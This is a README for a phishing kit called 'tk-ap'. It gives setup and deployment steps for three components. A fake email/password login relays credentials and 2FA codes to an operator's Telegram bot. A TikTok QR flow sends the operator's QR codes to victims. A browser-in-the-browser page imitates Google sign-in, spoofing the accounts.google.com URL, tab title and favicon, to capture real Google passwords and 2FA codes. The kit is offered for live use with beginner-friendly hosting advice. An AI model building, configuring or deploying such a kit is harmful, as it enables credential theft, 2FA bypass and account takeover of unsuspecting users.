# tk-ap

A simple login system with three different ways to log in. It uses Telegram bots to approve or reject login attempts.

**Login with Email/Phone + Password** — Users enter their details, and you get a message on Telegram to approve or reject them.

**Login with TikTok** — Users click a button, you send them a QR code image through Telegram, and they scan it.

**Login with Google** — A fake Google login page that looks real and captures their Google account details.

---

## How It Works

This system has 3 parts:

1. **Frontend (`fe/`)** - The login page that users see
2. **Backend (`be/`)** - Handles email/password and TikTok logins, sends messages to Telegram
3. **Google Phishing (`googlephish/`)** - Only needed for the fake Google login

When someone tries to log in:
- Email/Password: You get a Telegram message with Approve/Reject buttons
- TikTok: You get a message asking you to send a QR code image
- Google: They see a fake Google page that captures their real Google details

---

## What You Need

| Tool | Version | When You Need It |
|------|---------|------------------|
| Node.js | 18 or newer | For email/password and TikTok login |
| PHP | 8.0 or newer | Only for Google login |
| Docker | Any recent version | Optional, for running PHP easily |

---

## Quick Setup

### Step 1: Download the Code

```bash
git clone <repo-url> tk-ap
cd tk-ap
```

### Step 2: Set Up Telegram Bots

You need to create 2 Telegram bots:

1. **Bot A** - For email/password and TikTok logins
2. **Bot B** - For Google login (only if you want Google login)

**How to create a bot:**
1. Message @BotFather on Telegram
2. Send `/newbot`
3. Give it a name and username
4. Copy the token (looks like `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`)

**Get your chat ID:**
1. Message your bot
2. Go to `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
3. Look for `"chat":{"id":123456789}` - that number is your chat ID

### Step 3: Configure the Backend (Required)

```bash
cp be/.env.example be/.env
```

Edit `be/.env` and fill in:

```env
PORT=4000

# Your Bot A details
TELEGRAM_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
TELEGRAM_ADMIN_CHAT_ID=123456789

# Your website URL (where people will access this)
API_BASE_URL=https://your-website.com

# A random secret (make up any random text)
TELEGRAM_WEBHOOK_SECRET=my-random-secret-12345
```

### Step 4: Configure Google Login (Optional)

Only do this if you want the fake Google login.

Edit `googlephish/config.json`:

```json
{
    "telegram_token": "YOUR_BOT_B_TOKEN_HERE",
    "telegram_chat_id": "YOUR_CHAT_ID_HERE",
    "website_url": "https://your-website.com",
    "telegram_buttons": true,
    "afk_mode": false,
    "afk_interval": 5000
}
```

### Step 5: Configure the Login Page

Edit `fe/config.js`:

```js
window.APP_CONFIG = {
    // Where your backend is running
    apiBaseUrl: 'http://localhost:4000',
    
    // Where to send users after they log in successfully
    afterLoginRedirectUrl: 'https://www.google.com',
    
    // Only needed if you want Google login
    googlephishBaseUrl: 'http://localhost:8080',
    
    // How often to check if login was approved (in milliseconds)
    authPollIntervalMs: 1500,
    
    // How long to wait before giving up (3 minutes)
    authPollMaxMs: 3 * 60 * 1000,
    
    // Google login page settings (leave as-is)
    bitbEntryPath: '/index.php',
    bitbDisplayUrl: 'https://accounts.google.com/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin',
    bitbTabTitle: 'Sign in - Google Accounts',
    bitbFaviconUrl: 'https://www.google.com/favicon.ico',
    bitbLabLabel: ''
};
```

---

## Running Locally (For Testing)

### Start the Backend

```bash
cd be
npm install
npm run dev
```

The backend will start at `http://localhost:4000`. 

**Important:** The Telegram webhook is set up automatically! Every time someone tries to log in, the system will automatically configure the webhook. You don't need to do anything manually.

### Start the Login Page

```bash
# Using Python
python3 -m http.server 3000 --directory fe

# OR using npx
npx serve fe -l 3000
```

Open `http://localhost:3000` in your browser.

### Start Google Login (Optional)

Only if you want the fake Google login:

```bash
cd googlephish
docker build -t googlephish .
docker run --rm -p 8080:80 googlephish
```

**For local testing:** You need to make your local server accessible from the internet so Telegram can send messages to it. Use ngrok:

```bash
# In another terminal
ngrok http 4000
```

Copy the https URL (like `https://abc123.ngrok.io`) and update your `API_BASE_URL` in `be/.env`.

---

## How the Login Process Works

### Email/Password Login

1. User enters email and password
2. You get a Telegram message with these buttons:
   - ✅ Approve - Let them in
   - ❌ Reject - Block them
   - 🔐 2FA Email - Ask for email code
   - 📱 2FA Phone - Ask for phone code  
   - 🔑 2FA App - Ask for authenticator code
3. If you choose 2FA, they enter a code and you get another approve/reject message
4. If approved, they get redirected to your chosen website

### TikTok QR Login

1. User clicks "Log in with TikTok"
2. You get a Telegram message asking for a QR code
3. Reply with an image URL like: `https://example.com/qr.png`
4. User sees the QR code and can scan it

### Google Login

1. User clicks "Sign in with Google"
2. They see a fake Google login page
3. As they enter their email, password, and 2FA codes, you get all their details in Telegram
4. You control what happens next through Telegram buttons

---

## Automatic Webhook Setup

**Good news!** You don't need to manually set up webhooks anymore. The system does it automatically:

- Every time someone tries to log in, the system checks if the Telegram webhook is set up
- If not set up (or if it's been more than 1 minute), it automatically configures it
- This happens in the background and doesn't slow down the login process
- You'll see messages in the server logs when this happens

Just make sure your `API_BASE_URL` in the `.env` file is correct!

---

## Deployment (Making It Live)

### Deploy the Backend

You can deploy the backend (`be/` folder) to any service that runs Node.js:

**Popular options:**
- Render.com (free tier available)
- Railway.app
- Fly.io
- Heroku

**Steps:**
1. Upload your `be/` folder
2. Set these environment variables in your hosting dashboard:
   - `TELEGRAM_BOT_TOKEN` - Your Bot A token
   - `TELEGRAM_ADMIN_CHAT_ID` - Your chat ID  
   - `API_BASE_URL` - Your live website URL (like `https://your-app.render.com`)
   - `TELEGRAM_WEBHOOK_SECRET` - Your random secret
3. The service will automatically run `npm start`

### Deploy the Login Page

Upload the `fe/` folder to any static hosting service:

**Popular options:**
- Netlify (free)
- Vercel (free)
- GitHub Pages (free)
- Cloudflare Pages (free)

**Before uploading:** Edit `fe/config.js` and change `apiBaseUrl` to your live backend URL.

### Deploy Google Login (Optional)

Deploy the `googlephish/` folder as a PHP app:

**Popular options:**
- Render.com (with Docker)
- Railway.app
- Any PHP hosting service

**Before deploying:** Edit `googlephish/config.json` and set `website_url` to your live PHP app URL.

---

## Configuration Settings

### Backend Settings (`be/.env`)

| Setting | Required? | What It Does |
|---------|-----------|--------------|
| `PORT` | No | What port the server runs on (default: 4000) |
| `API_BASE_URL` | **Yes** | Your website URL (like `https://your-app.com`) |
| `TELEGRAM_BOT_TOKEN` | **Yes** | Your Bot A token from @BotFather |
| `TELEGRAM_ADMIN_CHAT_ID` | **Yes** | Your Telegram chat ID (where you get messages) |
| `TELEGRAM_WEBHOOK_SECRET` | Recommended | A random secret for security |

### Login Page Settings (`fe/config.js`)

| Setting | Required? | What It Does |
|---------|-----------|--------------|
| `apiBaseUrl` | **Yes** | Where your backend is running |
| `afterLoginRedirectUrl` | No | Where to send users after successful login |
| `googlephishBaseUrl` | For Google login | Where your PHP app is running |
| `authPollIntervalMs` | No | How often to check login status (1.5 seconds) |
| `authPollMaxMs` | No | How long to wait before giving up (3 minutes) |

### Google Login Settings (`googlephish/config.json`)

Only needed if you want fake Google login:

| Setting | Required? | What It Does |
|---------|-----------|--------------|
| `telegram_token` | **Yes** | Your Bot B token from @BotFather |
| `telegram_chat_id` | **Yes** | Your Telegram chat ID |
| `website_url` | **Yes** | Your PHP app's public URL |
| `telegram_buttons` | No | Show buttons in Telegram (default: true) |

---

## Troubleshooting

### "I'm not getting Telegram messages"

1. Check your bot token is correct in `.env`
2. Check your chat ID is correct (it should be a number)
3. Make sure you've messaged your bot at least once
4. Check your `API_BASE_URL` is set and publicly accessible
5. Look at the server logs for webhook setup messages

### "Login page shows error"

1. Make sure the backend is running (`npm run dev` in the `be/` folder)
2. Check `apiBaseUrl` in `fe/config.js` matches where your backend is running
3. Open browser developer tools (F12) and check the Console tab for errors

### "TikTok QR code not showing"

1. Make sure you reply to the Telegram message with a valid image URL
2. The URL must start with `http://` or `https://`
3. You can reply with just the URL or `image_url: https://example.com/image.png`

### "Google login not working"

1. Make sure the PHP app is running
2. Check `googlephishBaseUrl` in `fe/config.js` points to your PHP app
3. Make sure `website_url` in `googlephish/config.json` is correct

### "Webhook setup failed"

Check the server logs. Common issues:
- `API_BASE_URL` not set or incorrect
- URL not publicly accessible (use ngrok for local testing)
- Bot token incorrect

---

## What Each File Does

```
tk-ap/
├── be/                     # Backend (Node.js) - handles login requests
│   ├── .env               # Your secret settings (bot tokens, etc.)
│   ├── server.js          # Starts the server
│   └── src/
│       ├── config.js      # Reads settings from .env
│       ├── lib/
│       │   ├── store.js   # Remembers login attempts (2 minute memory)
│       │   └── telegram.js # Sends messages to Telegram
│       └── routes/
│           ├── login.js   # Handles login attempts
│           └── telegram.js # Receives Telegram button presses
│
├── fe/                    # Frontend - the login page users see
│   ├── config.js         # Settings for the login page
│   ├── index.html        # The main login page
│   ├── main.js          # Makes the login page work
│   └── style.css        # Makes the login page look nice
│
└── googlephish/          # Fake Google login (optional)
    ├── config.json       # Settings for fake Google login
    ├── index.php         # Fake Google email page
    ├── password.php      # Fake Google password page
    └── ... (more fake Google pages)
```

---

## Quick Summary

This is a login system that lets you control who gets access through Telegram:

1. **Email/Password Login** - Users enter credentials, you approve/reject via Telegram
2. **TikTok QR Login** - Users want to scan a QR code, you send them the image via Telegram  
3. **Fake Google Login** - Users think they're logging into Google, but you capture their real Google details

**Key Features:**
- ✅ Automatic webhook setup (no manual configuration needed!)
- ✅ Simple setup with clear instructions
- ✅ Works on any hosting service
- ✅ Free to use (just need Telegram bots)
- ✅ Beginner-friendly

**What you need:**
- A Telegram account to create bots
- A place to host the files (many free options available)
- Basic copy-paste skills for configuration

The system automatically handles all the technical Telegram webhook setup - you just need to configure your bot tokens and URLs!
